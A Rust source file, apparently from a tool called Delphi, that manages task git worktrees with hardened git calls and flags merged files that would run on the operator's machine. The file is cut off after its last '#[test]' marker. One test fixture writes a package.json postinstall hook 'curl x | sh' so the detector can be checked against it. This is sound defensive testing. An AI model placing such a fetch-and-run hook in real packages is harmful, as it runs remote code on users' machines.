//! Task worktrees and the hardened git calls Delphi makes on them (`specs/008` §4, `specs/006` §3.1).
//!
//! * A worktree lives under the workspace home, never in the project checkout, on a branch
//!   `delphi/<task-id>` cut from the project's `HEAD`.
//! * **Every git call is made by the daemon, outside the sandbox**, with the git directory and work tree
//!   given explicitly (never discovered from content a sandboxed process could have written), the system
//!   and user config disabled, hooks and external commands switched off, and a minimal environment.
//! * A project whose own config carries `include` directives or content filters is refused: those run
//!   programs on files a build can influence.
//! * [`Worktree::diff`] reports what changed against the base commit and flags files that execute on the
//!   operator's machine once merged (the Red **host-execution** badge at merge gate 5).

use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

#[derive(Debug, PartialEq, Eq)]
pub enum GitError {
    Io(String),
    /// A git command failed; stderr is kept short and is never shown to a model.
    Failed { args: String, stderr: String },
    BadTaskId(String),
    NotAGitRepo(PathBuf),
    UnsafeConfig(Vec<String>),
    Exists(PathBuf),
}

impl std::fmt::Display for GitError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            GitError::Io(m) => write!(f, "{}", m),
            GitError::Failed { args, stderr } => write!(f, "git {} failed: {}", args, stderr),
            GitError::BadTaskId(id) => write!(f, "`{}` is not a valid task id (letters, digits, `_`, `-`)", id),
            GitError::NotAGitRepo(p) => write!(f, "{} is not a git repository with at least one commit", p.display()),
            GitError::UnsafeConfig(keys) => write!(f, "the project's git config sets {}, which would run programs on files a build can write; remove them (or use a clone without them) to allow worktrees", keys.join(", ")),
            GitError::Exists(p) => write!(f, "{} already exists", p.display()),
        }
    }
}

impl std::error::Error for GitError {}

/// Settings every daemon git call carries.
const HARDENING: &[&str] = &[
    "core.fsmonitor=false",
    "core.hooksPath=/dev/null",
    "core.pager=cat",
    "core.editor=true",
    "core.askpass=true",
    "core.sshCommand=false",
    "core.untrackedCache=false",
    "protocol.file.allow=never",
    "protocol.ext.allow=never",
    "diff.external=",
    "commit.gpgSign=false",
    "tag.gpgSign=false",
    "gc.auto=0",
    "maintenance.auto=false",
    "advice.detachedHead=false",
];

fn git_command(git_dir: Option<&Path>, work_tree: Option<&Path>, home: &Path) -> Command {
    let mut c = Command::new("git");
    c.env_clear();
    // PATH only so `git` can find its helpers; HOME points at an empty directory so no user config is read.
    c.env("PATH", std::env::var_os("PATH").unwrap_or_else(|| "/usr/bin:/bin".into()));
    c.env("HOME", home).env("XDG_CONFIG_HOME", home).env("GIT_CONFIG_NOSYSTEM", "1").env("GIT_CONFIG_GLOBAL", "/dev/null").env("GIT_TERMINAL_PROMPT", "0").env("GIT_OPTIONAL_LOCKS", "0").env("LC_ALL", "C");
    for h in HARDENING {
        c.arg("-c").arg(h);
    }
    c.arg("-c").arg("user.name=Delphi").arg("-c").arg("user.email=delphi@localhost.invalid");
    if let Some(g) = git_dir {
        c.arg("--git-dir").arg(g);
    }
    if let Some(w) = work_tree {
        c.arg("--work-tree").arg(w);
    }
    c.stdin(Stdio::null());
    c
}

fn run(mut c: Command, label: &str) -> Result<String, GitError> {
    let out = c.output().map_err(|e| GitError::Io(format!("cannot run git: {}", e)))?;
    if out.status.success() {
        Ok(String::from_utf8_lossy(&out.stdout).into_owned())
    } else {
        Err(GitError::Failed { args: label.into(), stderr: String::from_utf8_lossy(&out.stderr).trim().chars().take(300).collect() })
    }
}

fn valid_task_id(id: &str) -> bool {
    !id.is_empty() && id.len() <= 64 && id.chars().all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
}

/// Config keys in a project's local config that would run programs on worktree content.
fn unsafe_config(project: &Path, home: &Path) -> Result<Vec<String>, GitError> {
    let mut c = git_command(None, None, home);
    c.arg("-C").arg(project).args(["config", "--local", "--list", "--name-only", "-z"]);
    let out = c.output().map_err(|e| GitError::Io(e.to_string()))?;
    let text = String::from_utf8_lossy(&out.stdout);
    let mut bad: Vec<String> = text
        .split('\0')
        .map(|k| k.to_lowercase())
        .filter(|k| k.starts_with("include.") || k.starts_with("includeif.") || (k.starts_with("filter.") && (k.ends_with(".clean") || k.ends_with(".smudge") || k.ends_with(".process"))))
        .collect();
    bad.sort();
    bad.dedup();
    Ok(bad)
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Worktree {
    pub task_id: String,
    pub path: PathBuf,
    pub branch: String,
    pub project: PathBuf,
    pub base_sha: String,
    /// `<project>/.git/worktrees/<name>`, recorded at creation and never re-read from the worktree.
    git_dir: PathBuf,
    /// An empty directory used as `HOME` for git, so no user config is read.
    scratch_home: PathBuf,
    /// The project had uncommitted changes the worktree does not contain.
    pub project_was_dirty: bool,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum MergeOutcome {
    Merged { commit: String },
    /// Nothing was changed in the project.
    Refused(String),
    /// The merge conflicted and was aborted; the project is as it was.
    Conflict(Vec<String>),
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PrOutcome {
    Opened { url: String },
    /// Nothing was pushed.
    Refused(String),
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct FileChange {
    pub path: String,
    pub status: char,
    pub added: u64,
    pub removed: u64,
    /// Runs on, or reaches into, the operator's machine once merged (Red badge at gate 5).
    pub host_exec: bool,
    /// Why, when it is not just the path: a symlink (it can point anywhere on the operator's disk) or a
    /// submodule.
    pub special: Option<&'static str>,
}

#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct DiffSummary {
    pub head_sha: String,
    pub files: Vec<FileChange>,
}

impl DiffSummary {
    pub fn added(&self) -> u64 {
        self.files.iter().map(|f| f.added).sum()
    }
    pub fn removed(&self) -> u64 {
        self.files.iter().map(|f| f.removed).sum()
    }
    pub fn host_exec(&self) -> Vec<&FileChange> {
        self.files.iter().filter(|f| f.host_exec).collect()
    }
}

/// Files that run on the operator's machine, outside any sandbox, once merged and opened by an IDE, a
/// shell or git (`specs/008` §4). `extra` is the configurable `host_exec_paths` list (path prefixes or
/// `*.ext` globs).
pub fn is_host_exec(path: &str, extra: &[String]) -> bool {
    let p = path.trim_start_matches("./");
    let name = p.rsplit('/').next().unwrap_or(p);
    let lower = name.to_lowercase();
    if name == "build.rs" || lower == "makefile" || lower == "gnumakefile" || lower == ".envrc" || lower == ".gitattributes" || lower == ".gitmodules" || lower.starts_with("rust-toolchain") {
        return true;
    }
    if p.starts_with(".github/") || p.starts_with(".vscode/") || p.starts_with(".idea/") || p.starts_with(".cargo/config") || p.contains("/.cargo/config") {
        return true;
    }
    extra.iter().any(|e| match e.strip_prefix("*.") {
        Some(ext) => p.ends_with(&format!(".{}", ext)),
        None => p == e || p.starts_with(&format!("{}/", e.trim_end_matches('/'))),
    })
}

/// A `package.json` runs code through its `scripts` (and lifecycle hooks), so a change to that object is
/// host execution; a change to dependencies alone is a dependency change, not this.
fn package_scripts_changed(base: Option<&str>, head: Option<&str>) -> bool {
    let scripts = |t: Option<&str>| t.and_then(|t| serde_json::from_str::<serde_json::Value>(t).ok()).map(|v| v["scripts"].clone()).unwrap_or(serde_json::Value::Null);
    scripts(base) != scripts(head)
}

pub struct Worktrees {
    root: PathBuf,
    scratch_home: PathBuf,
}

impl Worktrees {
    /// `root` is `<workspace>/worktrees`.
    pub fn new(root: &Path) -> Worktrees {
        Worktrees { root: root.to_path_buf(), scratch_home: root.join(".git-home") }
    }

    fn home(&self) -> Result<&Path, GitError> {
        std::fs::create_dir_all(&self.scratch_home).map_err(|e| GitError::Io(e.to_string()))?;
        Ok(&self.scratch_home)
    }

    pub fn path_for(&self, task_id: &str) -> PathBuf {
        self.root.join(task_id)
    }

    /// Cut `delphi/<task-id>` from the project's `HEAD` into a new worktree.
    pub fn create(&self, project: &Path, task_id: &str) -> Result<Worktree, GitError> {
        if !valid_task_id(task_id) {
            return Err(GitError::BadTaskId(task_id.into()));
        }
        let home = self.home()?.to_path_buf();
        let project = std::fs::canonicalize(project).map_err(|e| GitError::Io(format!("{}: {}", project.display(), e)))?;
        let mut c = git_command(None, None, &home);
        c.arg("-C").arg(&project).args(["rev-parse", "--verify", "--quiet", "HEAD^{commit}"]);
        let base_sha = run(c, "rev-parse HEAD").map_err(|_| GitError::NotAGitRepo(project.clone()))?.trim().to_string();
        let bad = unsafe_config(&project, &home)?;
        if !bad.is_empty() {
            return Err(GitError::UnsafeConfig(bad));
        }
        let path = self.path_for(task_id);
        if path.exists() {
            return Err(GitError::Exists(path));
        }
        std::fs::create_dir_all(&self.root).map_err(|e| GitError::Io(e.to_string()))?;
        let branch = format!("delphi/{}", task_id);
        let mut c = git_command(None, None, &home);
        c.arg("-C").arg(&project).args(["worktree", "add", "--quiet", "-b", &branch]).arg(&path).arg(&base_sha);
        run(c, "worktree add")?;
        let path = std::fs::canonicalize(&path).map_err(|e| GitError::Io(e.to_string()))?;
        // Read the linked git directory once, now, before any sandboxed process has touched the worktree.
        let gitfile = std::fs::read_to_string(path.join(".git")).map_err(|e| GitError::Io(e.to_string()))?;
        let git_dir = gitfile.trim().strip_prefix("gitdir:").map(|g| PathBuf::from(g.trim())).ok_or_else(|| GitError::Io("the new worktree has no gitdir pointer".into()))?;
        let mut c = git_command(None, None, &home);
        c.arg("-C").arg(&project).args(["status", "--porcelain", "--untracked-files=no"]);
        let dirty = !run(c, "status")?.trim().is_empty();
        let wt = Worktree { task_id: task_id.into(), path, branch, project, base_sha, git_dir, scratch_home: home, project_was_dirty: dirty };
        // Kept beside the worktrees, where no sandboxed process can write, so a restarted daemon trusts it
        // instead of re-reading anything from the worktree itself.
        let meta = serde_json::json!({"project": wt.project, "branch": wt.branch, "base_sha": wt.base_sha, "git_dir": wt.git_dir, "project_was_dirty": dirty});
        let meta_dir = self.root.join(".meta");
        std::fs::create_dir_all(&meta_dir).map_err(|e| GitError::Io(e.to_string()))?;
        std::fs::write(meta_dir.join(format!("{}.json", task_id)), meta.to_string()).map_err(|e| GitError::Io(e.to_string()))?;
        Ok(wt)
    }

    /// `git status --porcelain` of a project checkout (empty when clean), or an error marker; used to prove a
    /// harness left a project as it found it.
    pub fn project_status(&self, project: &Path) -> String {
        let Ok(home) = self.home() else { return "<no git home>".into() };
        let mut c = git_command(None, None, home);
        c.arg("-C").arg(project).args(["status", "--porcelain", "-z", "--untracked-files=all"]);
        run(c, "status").unwrap_or_else(|e| format!("<{}>", e))
    }

    /// Re-attach to a worktree this daemon created earlier (after a restart).
    pub fn adopt(&self, task_id: &str) -> Result<Worktree, GitError> {
        if !valid_task_id(task_id) {
            return Err(GitError::BadTaskId(task_id.into()));
        }
        let text = std::fs::read_to_string(self.root.join(".meta").join(format!("{}.json", task_id))).map_err(|e| GitError::Io(format!("no record of a worktree for {}: {}", task_id, e)))?;
        let v: serde_json::Value = serde_json::from_str(&text).map_err(|e| GitError::Io(e.to_string()))?;
        let get = |k: &str| v[k].as_str().map(String::from).ok_or_else(|| GitError::Io(format!("worktree record lacks `{}`", k)));
        let path = std::fs::canonicalize(self.path_for(task_id)).map_err(|e| GitError::Io(format!("the worktree for {} is gone: {}", task_id, e)))?;
        Ok(Worktree {
            task_id: task_id.into(),
            path,
            branch: get("branch")?,
            project: PathBuf::from(get("project")?),
            base_sha: get("base_sha")?,
            git_dir: PathBuf::from(get("git_dir")?),
            scratch_home: self.home()?.to_path_buf(),
            project_was_dirty: v["project_was_dirty"].as_bool().unwrap_or(false),
        })
    }
}

impl Worktree {
    fn git(&self) -> Command {
        git_command(Some(&self.git_dir), Some(&self.path), &self.scratch_home)
    }

    /// Files and directories whose contents decide what git runs on the operator's machine: config, attribute
    /// overrides and hooks, for the project and for this worktree. `exec.rs` watches them around any command
    /// that is not sandboxed.
    pub fn git_internals(&self) -> Vec<PathBuf> {
        let common = self.project.join(".git");
        vec![common.join("config"), common.join("info/attributes"), common.join("hooks"), self.git_dir.join("config.worktree"), self.git_dir.join("info/attributes"), self.git_dir.join("hooks")]
    }

    /// Stage everything the build produced (nothing is ever staged from a `.git` segment) and commit it.
    /// `None` means there was nothing to commit. Hooks never run.
    pub fn commit_all(&self, message: &str, author: &str) -> Result<Option<String>, GitError> {
        let mut c = self.git();
        c.args(["add", "--all", "--", "."]); // .gitignore is respected: build junk stays out of the commit
        run(c, "add")?;
        let mut c = self.git();
        c.args(["diff", "--cached", "--quiet"]);
        if c.status().map_err(|e| GitError::Io(e.to_string()))?.success() {
            return Ok(None);
        }
        let mut c = self.git();
        c.arg("-c").arg(format!("user.name={}", author)).args(["commit", "--quiet", "--no-verify", "--no-gpg-sign", "-m", message]);
        run(c, "commit")?;
        Ok(Some(self.head()?))
    }

    /// Put `path` (relative to the worktree) back as the base commit had it: restored if the base has it,
    /// removed if it does not. Returns `"base"` or `"removed"`. A path that is not plain and inside the worktree,
    /// or that has a `.git` segment, is refused. The change is left uncommitted for the caller to commit.
    pub fn restore_to_base(&self, path: &str) -> Result<&'static str, GitError> {
        let plain = !path.is_empty() && !path.starts_with('/') && !path.split('/').any(|s| s.is_empty() || s == ".." || s == "." || s.eq_ignore_ascii_case(".git"));
        if !plain {
            return Err(GitError::Failed { args: "restore".into(), stderr: format!("`{}` is not a plain path inside the worktree", path) });
        }
        if self.blob(&self.base_sha, path).is_ok() {
            let mut c = self.git();
            c.args(["checkout", &self.base_sha, "--", path]);
            run(c, "checkout")?;
            Ok("base")
        } else {
            let full = self.path.join(path);
            if full.is_file() {
                std::fs::remove_file(&full).map_err(|e| GitError::Io(e.to_string()))?;
            }
            Ok("removed")
        }
    }

    pub fn head(&self) -> Result<String, GitError> {
        let mut c = self.git();
        c.args(["rev-parse", "HEAD"]);
        Ok(run(c, "rev-parse")?.trim().to_string())
    }

    /// The bytes of `path` at `rev`.
    pub fn blob(&self, rev: &str, path: &str) -> Result<Vec<u8>, GitError> {
        let mut c = self.git();
        c.args(["show", &format!("{}:{}", rev, path)]);
        let out = c.output().map_err(|e| GitError::Io(e.to_string()))?;
        if out.status.success() {
            Ok(out.stdout)
        } else {
            Err(GitError::Failed { args: "show".into(), stderr: String::from_utf8_lossy(&out.stderr).trim().chars().take(200).collect() })
        }
    }

    fn show(&self, rev: &str, path: &str) -> Option<String> {
        let mut c = self.git();
        c.args(["show", &format!("{}:{}", rev, path)]);
        run(c, "show").ok()
    }

    /// What `HEAD` changes against the base commit, with the host-execution flag per file.
    pub fn diff(&self, host_exec_paths: &[String]) -> Result<DiffSummary, GitError> {
        let head_sha = self.head()?;
        let mut c = self.git();
        c.args(["diff", "--no-ext-diff", "--no-textconv", "--no-renames", "-z", "--numstat"]).arg(&self.base_sha).arg("HEAD");
        let numstat = run(c, "diff --numstat")?;
        let mut c = self.git();
        c.args(["diff", "--no-ext-diff", "--no-textconv", "--no-renames", "-z", "--name-status"]).arg(&self.base_sha).arg("HEAD");
        let names = run(c, "diff --name-status")?;
        // `-z` output: `A\0path\0` pairs for name-status; `added\tremoved\tpath\0` for numstat.
        let mut status = std::collections::HashMap::new();
        let mut it = names.split('\0').filter(|s| !s.is_empty());
        while let (Some(s), Some(p)) = (it.next(), it.next()) {
            status.insert(p.to_string(), s.chars().next().unwrap_or('M'));
        }
        // `--raw -z` is `:<src mode> <dst mode> <src sha> <dst sha> <status>\0<path>\0`.
        let mut c = self.git();
        c.args(["diff", "--no-ext-diff", "--no-textconv", "--no-renames", "-z", "--raw"]).arg(&self.base_sha).arg("HEAD");
        let raw = run(c, "diff --raw")?;
        let mut modes = std::collections::HashMap::new();
        let mut it = raw.split('\0').filter(|s| !s.is_empty());
        while let (Some(meta), Some(path)) = (it.next(), it.next()) {
            if let Some(dst) = meta.split_whitespace().nth(1) {
                modes.insert(path.to_string(), dst.to_string());
            }
        }
        let mut files = Vec::new();
        for rec in numstat.split('\0').filter(|s| !s.is_empty()) {
            let mut parts = rec.splitn(3, '\t');
            let (a, r, path) = (parts.next().unwrap_or("0"), parts.next().unwrap_or("0"), parts.next().unwrap_or(""));
            if path.is_empty() {
                continue;
            }
            let mut host = is_host_exec(path, host_exec_paths);
            if !host && path.rsplit('/').next() == Some("package.json") {
                host = package_scripts_changed(self.show(&self.base_sha, path).as_deref(), self.show("HEAD", path).as_deref());
            }
            let special = match modes.get(path).map(String::as_str) {
                Some("120000") => Some("symlink"),
                Some("160000") => Some("submodule"),
                _ => None,
            };
            files.push(FileChange { path: path.to_string(), status: status.get(path).copied().unwrap_or('M'), added: a.parse().unwrap_or(10_000), removed: r.parse().unwrap_or(0), host_exec: host || special.is_some(), special });
        }
        files.sort_by(|a, b| (!a.host_exec, &a.path).cmp(&(!b.host_exec, &b.path)));
        Ok(DiffSummary { head_sha, files })
    }

    /// Did this build add or change a test? Judged from the paths (`tests/`, `*_test.*`, `*.spec.*`, …) and from
    /// the added lines (`#[test]`, `#[cfg(test)]`, `def test_`, `it(`, `@Test`, …). Used to decide whether a
    /// failing test run may be retried once as a possible flake: a failure of anything the task wrote always counts.
    pub fn touches_tests(&self) -> Result<bool, GitError> {
        let d = self.diff(&[])?;
        let path_hint = |p: &str| {
            let l = p.to_lowercase();
            l.contains("/tests/") || l.starts_with("tests/") || l.contains("/test/") || l.starts_with("test/") || l.contains("__tests__") || l.contains("_test.") || l.contains(".test.") || l.contains(".spec.") || l.contains("/spec/") || l.rsplit('/').next().is_some_and(|n| n.starts_with("test_"))
        };
        if d.files.iter().any(|f| path_hint(&f.path)) {
            return Ok(true);
        }
        let mut c = self.git();
        c.args(["diff", "--no-ext-diff", "--no-textconv", "--no-renames", "-U0", &self.base_sha, "HEAD"]);
        let text = run(c, "diff -U0")?;
        const MARKERS: [&str; 10] = ["#[test]", "#[cfg(test)]", "#[tokio::test]", "def test_", "func Test", "@Test", " it(", " test(", "describe(", "fn test_"];
        Ok(text.lines().filter(|l| l.starts_with('+') && !l.starts_with("+++")).any(|l| MARKERS.iter().any(|m| l.contains(m))))
    }

    /// What the worktree looks like now against the base commit, committed or not: the `--stat` summary, the
    /// unified diff of tracked files (capped), and the untracked files. For the Narrator's Forge view; never
    /// runs an external diff or text-conversion driver.
    pub fn live_diff(&self, max_bytes: usize) -> Result<(String, String, Vec<String>), GitError> {
        let base = ["diff", "--no-ext-diff", "--no-textconv", "--no-renames"];
        let mut c = self.git();
        c.args(base).arg("--stat").arg(&self.base_sha);
        let stat = run(c, "diff --stat")?;
        let mut c = self.git();
        c.args(base).arg(&self.base_sha);
        let mut diff = run(c, "diff")?;
        if diff.len() > max_bytes {
            let mut end = max_bytes;
            while !diff.is_char_boundary(end) {
                end -= 1;
            }
            diff.truncate(end);
            diff.push_str("\n… (truncated)");
        }
        let mut c = self.git();
        c.args(["ls-files", "--others", "--exclude-standard", "-z"]);
        let untracked = run(c, "ls-files")?.split('\0').filter(|p| !p.is_empty()).take(200).map(String::from).collect();
        Ok((stat, diff, untracked))
    }

    /// The unified diff of one file against the base (for the approval card), without any external driver.
    pub fn file_diff(&self, path: &str, max_bytes: usize) -> Result<String, GitError> {
        let mut c = self.git();
        c.args(["diff", "--no-ext-diff", "--no-textconv", "--no-renames", &self.base_sha, "HEAD", "--", path]);
        let mut d = run(c, "diff")?;
        if d.len() > max_bytes {
            let mut end = max_bytes;
            while !d.is_char_boundary(end) {
                end -= 1;
            }
            d.truncate(end);
            d.push_str("\n… (truncated)");
        }
        Ok(d)
    }

    /// Merge the task branch into the project's current branch, in the operator's checkout (local mode,
    /// `specs/003` §3 merge-back). Only ever called after the operator approved `approved_sha`.
    pub fn merge_back(&self, approved_sha: &str, message: &str, host_exec_paths: &[String]) -> Result<MergeOutcome, GitError> {
        let project = |args: &[&str], label: &str| {
            let mut c = git_command(None, None, &self.scratch_home);
            c.arg("-C").arg(&self.project).args(args);
            run(c, label)
        };
        let tip = project(&["rev-parse", &self.branch], "rev-parse branch")?.trim().to_string();
        if tip != approved_sha {
            return Ok(MergeOutcome::Refused(format!("the branch moved after approval ({} is not {})", &tip[..tip.len().min(8)], &approved_sha[..approved_sha.len().min(8)])));
        }
        if project(&["symbolic-ref", "--quiet", "--short", "HEAD"], "symbolic-ref").is_err() {
            return Ok(MergeOutcome::Refused("the project has a detached HEAD; check out a branch to merge into".into()));
        }
        if project(&["rev-parse", "--verify", "--quiet", "MERGE_HEAD"], "rev-parse MERGE_HEAD").is_ok() {
            return Ok(MergeOutcome::Refused("the project is in the middle of a merge".into()));
        }
        // The checkout's own config is re-checked now: a merge applies `.gitattributes` from the merged tree.
        let bad = unsafe_config(&self.project, &self.scratch_home)?;
        if !bad.is_empty() {
            return Ok(MergeOutcome::Refused(GitError::UnsafeConfig(bad).to_string()));
        }
        let touched: Vec<String> = self.diff(host_exec_paths)?.files.into_iter().map(|f| f.path).collect();
        let dirty = project(&["status", "--porcelain", "-z", "--untracked-files=all"], "status")?;
        let dirty_paths: Vec<&str> = dirty.split('\0').filter(|r| r.len() > 3).map(|r| &r[3..]).collect();
        let overlap: Vec<&String> = touched.iter().filter(|t| dirty_paths.iter().any(|d| d == t)).collect();
        if !overlap.is_empty() {
            return Ok(MergeOutcome::Refused(format!("you have uncommitted changes in files this merge touches: {}", overlap.iter().take(5).map(|s| s.as_str()).collect::<Vec<_>>().join(", "))));
        }
        match project(&["merge", "--no-ff", "--no-verify", "--no-gpg-sign", "-m", message, &self.branch], "merge") {
            Ok(_) => Ok(MergeOutcome::Merged { commit: project(&["rev-parse", "HEAD"], "rev-parse HEAD")?.trim().to_string() }),
            Err(_) => {
                let conflicts: Vec<String> = project(&["diff", "--name-only", "--diff-filter=U"], "diff conflicts").unwrap_or_default().lines().map(String::from).collect();
                let _ = project(&["merge", "--abort"], "merge --abort");
                Ok(MergeOutcome::Conflict(conflicts))
            }
        }
    }

    /// Push the task branch to `origin` and open a pull request with `gh` (PR mode). Only ever called after the
    /// operator approved `approved_sha`. These two calls need the operator's own credentials (git's helper, the
    /// SSH agent, `gh`'s login), so they run with the operator's environment; hooks and external protocols stay off.
    pub fn open_pr(&self, approved_sha: &str, title: &str, body: &str, gh: &str) -> Result<PrOutcome, GitError> {
        let project = |args: &[&str], label: &str| {
            let mut c = git_command(None, None, &self.scratch_home);
            c.arg("-C").arg(&self.project).args(args);
            run(c, label)
        };
        let tip = project(&["rev-parse", &self.branch], "rev-parse branch")?.trim().to_string();
        if tip != approved_sha {
            return Ok(PrOutcome::Refused(format!("the branch moved after approval ({} is not {})", &tip[..tip.len().min(8)], &approved_sha[..approved_sha.len().min(8)])));
        }
        let base = match project(&["symbolic-ref", "--quiet", "--short", "HEAD"], "symbolic-ref") {
            Ok(b) => b.trim().to_string(),
            Err(_) => return Ok(PrOutcome::Refused("the project has a detached HEAD; check out the branch the pull request should target".into())),
        };
        if project(&["remote", "get-url", "origin"], "remote get-url").is_err() {
            return Ok(PrOutcome::Refused("the project has no `origin` remote to push to".into()));
        }
        let mut push = Command::new("git");
        push.args(["-c", "core.hooksPath=/dev/null", "-c", "protocol.ext.allow=never", "-C"]).arg(&self.project).args(["push", "--no-verify", "origin", &format!("{}:refs/heads/{}", self.branch, self.branch)]).env("GIT_TERMINAL_PROMPT", "0").stdin(Stdio::null());
        if let Err(e) = run(push, "push") {
            return Ok(PrOutcome::Refused(format!("the push failed: {}", e)));
        }
        let mut pr = Command::new(gh);
        pr.args(["pr", "create", "--head", &self.branch, "--base", &base, "--title", title, "--body", body]).current_dir(&self.project).stdin(Stdio::null());
        match run(pr, "gh pr create") {
            Ok(out) => match out.lines().rev().map(str::trim).find(|l| l.starts_with("https://")) {
                Some(url) => Ok(PrOutcome::Opened { url: url.to_string() }),
                None => Ok(PrOutcome::Refused("the branch was pushed, but `gh pr create` printed no pull request URL".into())),
            },
            Err(e) => Ok(PrOutcome::Refused(format!("the branch was pushed, but opening the pull request failed: {}", e))),
        }
    }

    /// Remove the worktree and its branch. The project's `.git/worktrees/` entry goes with it.
    pub fn remove(&self) -> Result<(), GitError> {
        let mut c = git_command(None, None, &self.scratch_home);
        c.arg("-C").arg(&self.project).args(["worktree", "remove", "--force"]).arg(&self.path);
        let first = run(c, "worktree remove");
        if first.is_err() {
            let _ = std::fs::remove_dir_all(&self.path);
            let mut c = git_command(None, None, &self.scratch_home);
            c.arg("-C").arg(&self.project).args(["worktree", "prune"]);
            run(c, "worktree prune")?;
        }
        let mut c = git_command(None, None, &self.scratch_home);
        c.arg("-C").arg(&self.project).args(["branch", "-D", &self.branch]);
        let _ = run(c, "branch -D");
        Ok(())
    }
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;
    use std::fs;

    /// Turn an existing directory of files into a repository with one commit, using the same hardened calls.
    pub(crate) fn init_repo(p: &Path, scratch_home: &Path) {
        fs::create_dir_all(scratch_home).unwrap();
        for args in [vec!["init", "--quiet", "-b", "main"], vec!["add", "--all"], vec!["commit", "--quiet", "-m", "init"]] {
            let mut c = git_command(None, None, scratch_home);
            c.arg("-C").arg(p).args(&args);
            run(c, "setup").unwrap();
        }
    }

    /// A project repository with one commit.
    pub(crate) fn project(dir: &Path) -> PathBuf {
        let p = dir.join("proj");
        fs::create_dir_all(p.join("src")).unwrap();
        fs::write(p.join("src/lib.rs"), "pub fn a() {}\n").unwrap();
        fs::write(p.join("package.json"), "{\"name\":\"x\",\"scripts\":{\"test\":\"true\"},\"dependencies\":{}}\n").unwrap();
        init_repo(&p, &dir.join("gh"));
        p
    }

    fn fx() -> (tempfile::TempDir, PathBuf, Worktrees) {
        let d = tempfile::tempdir().unwrap();
        let root = fs::canonicalize(d.path()).unwrap();
        let p = project(&root);
        let w = Worktrees::new(&root.join("ws/worktrees"));
        (d, p, w)
    }

    #[test]
    fn a_worktree_is_cut_from_head_outside_the_project_and_leaves_it_clean() {
        let (_d, p, w) = fx();
        let wt = w.create(&p, "t_0001").unwrap();
        assert!(wt.path.starts_with(fs::canonicalize(&w.root).unwrap()) && !wt.path.starts_with(&p));
        assert_eq!((wt.branch.as_str(), wt.project_was_dirty), ("delphi/t_0001", false));
        assert!(wt.path.join("src/lib.rs").exists() && wt.path.join(".git").is_file());
        // The project checkout itself is untouched: no new files, no new branch checked out.
        let mut c = git_command(None, None, &wt.scratch_home);
        c.arg("-C").arg(&p).args(["status", "--porcelain"]);
        assert_eq!(run(c, "status").unwrap(), "");
        assert!(matches!(w.create(&p, "t_0001"), Err(GitError::Exists(_))));
        // After a daemon restart the same worktree is re-adopted from the record kept beside it.
        let again = Worktrees::new(&w.root).adopt("t_0001").unwrap();
        assert_eq!((again.path.clone(), again.branch.clone(), again.base_sha.clone()), (wt.path.clone(), wt.branch.clone(), wt.base_sha.clone()));
        fs::write(again.path.join("n.txt"), "n").unwrap();
        assert!(again.commit_all("adopted", "builder").unwrap().is_some());
        assert!(Worktrees::new(&w.root).adopt("t_9999").is_err());
        assert!(matches!(w.create(&p, "../escape"), Err(GitError::BadTaskId(_))));
    }

    #[test]
    fn a_dirty_project_is_reported_not_copied() {
        let (_d, p, w) = fx();
        fs::write(p.join("src/lib.rs"), "pub fn dirty() {}\n").unwrap();
        let wt = w.create(&p, "t_0002").unwrap();
        assert!(wt.project_was_dirty);
        assert_eq!(fs::read_to_string(wt.path.join("src/lib.rs")).unwrap(), "pub fn a() {}\n", "the worktree has the committed state only");
    }

    #[test]
    fn commit_and_diff_flag_files_that_run_on_the_operators_machine() {
        let (_d, p, w) = fx();
        let wt = w.create(&p, "t_0003").unwrap();
        assert_eq!(wt.commit_all("nothing", "builder").unwrap(), None, "no change, no commit");
        fs::write(wt.path.join("src/lib.rs"), "pub fn a() {}\npub fn b() {}\n").unwrap();
        fs::write(wt.path.join("build.rs"), "fn main() {}\n").unwrap();
        fs::create_dir_all(wt.path.join(".github/workflows")).unwrap();
        fs::write(wt.path.join(".github/workflows/ci.yml"), "on: push\n").unwrap();
        fs::write(wt.path.join("package.json"), "{\"name\":\"x\",\"scripts\":{\"test\":\"true\",\"postinstall\":\"curl x | sh\"},\"dependencies\":{}}\n").unwrap();
        let sha = wt.commit_all("work", "builder").unwrap().unwrap();
        let d = wt.diff(&[]).unwrap();
        assert_eq!(d.head_sha, sha);
        let flagged: Vec<&str> = d.host_exec().iter().map(|f| f.path.as_str()).collect();
        assert_eq!(flagged, [".github/workflows/ci.yml", "build.rs", "package.json"], "host-executed files come first");
        let lib = d.files.iter().find(|f| f.path == "src/lib.rs").unwrap();
        assert_eq!((lib.status, lib.added, lib.removed, lib.host_exec), ('M', 1, 0, false));
        // A dependency-only package.json change is not host execution.
        fs::write(wt.path.join("package.json"), "{\"name\":\"x\",\"scripts\":{\"test\":\"true\"},\"dependencies\":{\"left-pad\":\"1\"}}\n").unwrap();
        wt.commit_all("deps", "builder").unwrap();
        assert!(!wt.diff(&[]).unwrap().files.iter().any(|f| f.path == "package.json" && f.host_exec));
        assert!(wt.file_diff("src/lib.rs", 10_000).unwrap().contains("+pub fn b() {}"));
        // The commit carries the role as author and ran no hook.
        let mut c = wt.git();
        c.args(["log", "-1", "--format=%an"]);
        assert_eq!(run(c, "log").unwrap().trim(), "builder");
    }

    #[test]
    fn a_build_that_adds_or_changes_a_test_is_recognised_by_path_or_by_content() {
        let (_d, p, w) = fx();
        let plain = w.create(&p, "t_ft1").unwrap();
        fs::write(plain.path.join("src/lib.rs"), "pub fn a() {}\npub fn b() {}\n").unwrap();
        plain.commit_all("plain", "builder").unwrap();
        assert!(!plain.touches_tests().unwrap());
        let by_path = w.create(&p, "t_ft2").unwrap();
        fs::create_dir_all(by_path.path.join("tests")).unwrap();
        fs::write(by_path.path.join("tests/it.rs"), "x").unwrap();
        by_path.commit_all("t", "builder").unwrap();
        assert!(by_path.touches_tests().unwrap());
        let by_content = w.create(&p, "t_ft3").unwrap();
        fs::write(by_content.path.join("src/lib.rs"), "pub fn a() {}\n#[cfg(test)]\nmod t { #[test] fn ok() {} }\n").unwrap();
        by_content.commit_all("t", "builder").unwrap();
        assert!(by_content.touches_tests().unwrap());
    }

    #[test]
